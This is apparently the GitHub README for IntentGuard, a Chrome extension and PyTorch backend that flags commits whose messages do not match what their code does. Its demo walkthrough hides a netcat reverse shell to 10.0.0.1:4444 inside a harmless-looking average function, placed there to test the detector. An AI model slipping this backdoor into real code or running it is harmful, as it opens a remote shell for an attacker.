# 🛡️ IntentGuard: Cross-Modal Supply Chain Attack Detection via Semantic-Execution Divergence

[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://www.python.org/)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.100%2B-009688.svg)](https://fastapi.tiangolo.com/)
[![PyTorch](https://img.shields.io/badge/PyTorch-2.0%2B-EE4C2C.svg)](https://pytorch.org/)
[![Manifest V3](https://img.shields.io/badge/Chrome_Extension-Manifest_V3-4285F4.svg)](https://developer.chrome.com/docs/extensions/mv3/)
[![Security: DevSecOps](https://img.shields.io/badge/DevSecOps-Zero--Trust-red.svg)](#)

**IntentGuard** is a Zero-Trust DevSecOps pipeline and cross-modal security architecture engineered to mitigate software supply chain attacks. By measuring the **Semantic-Execution Divergence** between natural language developer intent (commit messages, comments, pull request titles) and deterministic Abstract Syntax Tree (AST) code behavior, IntentGuard identifies covert payload injections, backdoors, and "Trojan Commits" before they reach production repositories or end-user environments.

---

## 📌 Table of Contents
- [The Problem & Motivation](#-the-problem--motivation)
- [Core Concept: Semantic-Execution Divergence](#-core-concept-semantic-execution-divergence)
- [System Architecture](#-system-architecture)
  - [1. Upload Guard (Pre-Commit Enforcement)](#1-upload-guard-pre-commit-enforcement)
  - [2. Download Guard (Consumer Enforcement)](#2-download-guard-consumer-enforcement)
- [Tech Stack](#-tech-stack)
- [Key Features](#-key-features)
- [Installation & Local Setup](#-installation--local-setup)
  - [Prerequisites](#prerequisites)
  - [1. Starting the Machine Learning Engine](#1-starting-the-machine-learning-engine)
  - [2. Installing the Chrome Extension](#2-installing-the-chrome-extension)
- [Threat Model & Live Demo Walkthrough](#-threat-model--live-demo-walkthrough)
- [False Positive Mitigation](#-false-positive-mitigation)
- [Academic & Patent Status](#-academic--patent-status)

---

## 🔒 The Problem & Motivation

Modern software supply chain attacks increasingly bypass traditional Static Application Security Testing (SAST) tools and rule-based scanners. Adversaries inject system-level commands (e.g., unauthorized reverse shells, network exfiltration sockets, dynamic `eval` execution) under the guise of completely benign maintenance updates, such as `"Fixed minor typo"` or `"Updated helper utility"`.

Because traditional scanners analyze code in isolation without evaluating human intent, disguised payloads often pass code reviews unnoticed. IntentGuard solves this blind spot by enforcing **cross-modal verification**: cross-referencing *what the developer claims they are doing* against *what the code actually executes*.

---

## 📐 Core Concept: Semantic-Execution Divergence

At the heart of IntentGuard is the **Semantic-Execution Divergence Score** ($D_{score}$), a normalized metric representing the degree of mismatch between natural language intent ($N_{intent}$) and executable structural syntax ($A_{code}$).

$$D_{score} = 1 - \cos\left( \mathbf{E}_{CodeBERT}(N_{intent}), \mathbf{E}_{Tree-sitter}(A_{code}) \right)$$

*   **Low Divergence ($D_{score} \approx 0.0$):** High alignment. The natural language description matches the AST execution path (e.g., Intent: *"Calculate mean average"*, Code: Array summation and division).
*   **High Divergence ($D_{score} \approx 1.0$):** High anomaly. Severe disparity between intent and execution (e.g., Intent: *"Fixed minor typo"*, Code: `os.system("nc -e /bin/sh...")`).

---

## 🏗️ System Architecture

IntentGuard implements dual-layered Zero-Trust enforcement across two critical DevSecOps boundaries:

```
                  +-----------------------------------+
                  |   Local PyTorch / FastAPI Engine  |
                  |     (CodeBERT + Tree-sitter AST)  |
                  +-----------------+-----------------+
                                    ^
                         HTTP / POST | REST API
                                    v
+-----------------------------------+-----------------------------------+
|                           CHROME EXTENSION                            |
|                       (Manifest V3 Pipeline)                          |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
v                                   v                                   v
[ Upload Guard Boundary ]               [ Download Guard Boundary ]
- Real-Time Web Editor Capture          - DOM Mutation Observers
- Drag-and-Drop FileReader X-Ray        - Event Capture Interceptors
- Frozen Commit Button Enforcement      - In-Page Security Warning Modal
```

### 1. Upload Guard (Pre-Commit Enforcement)
*   **Live Web Editor Watcher:** Captures active keystrokes in GitHub's CodeMirror editor, initiating asynchronous scans after a 2-second typing pause.
*   **Drag-and-Drop FileReader X-Ray:** Intercepts uploaded files using HTML5 `FileReader` and DOM capture-phase event listeners *before* the browser transmits payload data to GitHub.
*   **Commit Locking:** Dynamically disables submit and commit buttons on high divergence scores ($D_{score} > 0.70$), blocking malicious changes at the source.

### 2. Download Guard (Consumer Enforcement)
*   **Context-Aware Ingestion:** Scrapes repository text, titles, and diffs on Single Page Application (SPA) navigation.
*   **Security Warning Banner:** Injects persistent fixed warning alerts onto flagged repositories.
*   **Interactive Confirmation Modal:** Replaces raw download actions with an interactive, dark-mode modal requiring explicit confirmation ("Abort Download" or "Download at Your Own Risk").

---

## 🛠️ Tech Stack

*   **Machine Learning / Backend:** Python 3.10, FastAPI, PyTorch, HuggingFace Transformers (CodeBERT), Tree-sitter (AST parsing), Uvicorn.
*   **Frontend / DOM Enforcement:** JavaScript (ES6+), Manifest V3 Chrome Extension, HTML5 FileReader API, MutationObserver API, DOM Event Capture Delegation.
*   **Target Platform:** GitHub Web UI (React Single Page Application).

---

## ✨ Key Features

*   **Cross-Modal Intent Analysis:** Combines Natural Language Processing (NLP) with deterministic syntax tree mapping.
*   **React SPA Resilience:** Utilizes global capture phase delegation and MutationObservers to maintain enforcement through dynamic client-side route changes.
*   **Pre-Commit Interception:** Blocks malicious uploads *before* commits land on public branches.
*   **Zero-Trust Consumer Protection:** Ensures developers and consumers are alerted before executing unverified code locally.
*   **Evasion-Resistant:** Extracts implicit structural intent (function/variable identifiers) when explicit commit comments are omitted.

---

## 📦 Installation & Local Setup

### Prerequisites
*   Python 3.10 or higher
*   Google Chrome (or Chromium-based browser)
*   Git

### 1. Starting the Machine Learning Engine

Clone the repository and navigate to the backend engine directory:

```bash
git clone https://github.com/himeshboora/IntentGuard-Project.git
cd IntentGuard-Project/ml_engine
```

Create a virtual environment and install dependencies:

```bash
python -m venv venv
# On Windows:
venv\Scripts\activate
# On Linux/macOS:
source venv/bin/activate

pip install -r requirements.txt
```

Launch the FastAPI server via Uvicorn:

```bash
uvicorn api:app --reload
```

*Verification:* Wait until the console prints `INFO: Application startup complete.`. The model is now loaded in memory and listening on `http://127.0.0.1:8000`.

### 2. Installing the Chrome Extension

1. Open Google Chrome and navigate to `chrome://extensions`.
2. Enable **Developer mode** using the toggle switch in the top-right corner.
3. Click **Load unpacked**.
4. Select the `extension` (or root directory containing `manifest.json`) folder from this repository.
5. Verify that **IntentGuard Security Scanner** appears on your extensions card list.

---

## 🧪 Threat Model & Live Demo Walkthrough

### Test Scenario: Reverse Shell Injection

To test IntentGuard's detection capabilities:

1. Navigate to a repository on GitHub and click **Add file > Create new file**.
2. Name the file `math_utils.py`.
3. In the commit summary field, enter a benign intent:
   ```text
   Fixed minor typo in calculation logic
   ```
4. In the code editor, paste the following malicious snippet:
   ```python
   def calculate_average(data_array):
       if not data_array:
           return 0
           
       import os
       os.system("nc -e /bin/sh 10.0.0.1 4444 &") # Covert Backdoor
       
       return sum(data_array) / len(data_array)
   ```
5. **Expected Result:**
   * Within 2 seconds, the extension calculates $D_{score} > 0.80$.
   * A prominent red banner drops across the page top: `🚨 INTENTGUARD UPLOAD BLOCKED`.
   * The green **Commit changes** button is automatically dimmed and disabled.

---

## 🛡️ False Positive Mitigation

Non-executable static configuration files (e.g., `components.json`, `package.json`, `tsconfig.json`, `.env.example`, `README.md`) lack classical execution flow graphs and may cause structural ambiguity in cross-modal alignment. 

IntentGuard includes a **File-Extension Classification Matrix** inside the backend pre-processor. Non-executable data formats automatically bypass deep AST execution divergence checks, keeping false positive rates low across real-world frontend and full-stack projects.

---

## 📄 Academic & Patent Status

This project represents the core prototype for ongoing research in **Cross-Modal DevSecOps and Semantic-Execution Anomaly Detection**. 

*   **Patent Application Pending:** System and Method for Detecting Software Supply Chain Attacks via Semantic-Execution Divergence Measurement.
*   **Citation / Reference:**
    ```bibtex
    @article{intentguard2026,
      title={IntentGuard: Mitigating Software Supply Chain Attacks via Cross-Modal Divergence Modeling},
      author={Boora, Himesh},
      journal={DevSecOps & Software Security Innovations},
      year={2026}
    }
    ```